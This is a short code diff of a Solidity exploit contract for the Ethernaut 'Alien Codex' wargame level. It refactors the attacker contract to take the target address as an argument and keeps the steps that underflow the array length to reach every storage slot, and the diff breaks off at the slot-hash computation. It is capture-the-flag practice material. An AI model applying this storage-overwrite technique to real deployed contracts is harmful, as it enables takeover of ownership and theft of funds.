@@ -23,18 +23,16 @@ interface IAlienCodex {
 
     function makeContact() external;
 
-    function record(bytes32 _content) external;
-
     function retract() external;
 
     function revise(uint256 i, bytes32 _content) external;
 }
 
-contract Ethernaut_AlienCodex {
-    IAlienCodex private alienCodex =
-        IAlienCodex(0xE57dAB9816371BEcC0E4fA092eb7FBE7C39365a6); // Replace with your Alien Codex instance
+contract AlienDecodex {
+    IAlienCodex private immutable alienCodex;
 
-    constructor() {
+    constructor(address _alienCodex) {
+        alienCodex = IAlienCodex(_alienCodex);
         alienCodex.makeContact();
         alienCodex.retract(); // Array length underflow, length is now: 2^256 - 1 (meaning access to all storage slots)
         bytes32 hash = keccak256(abi.encode(1)); // Hash the array's length's slot
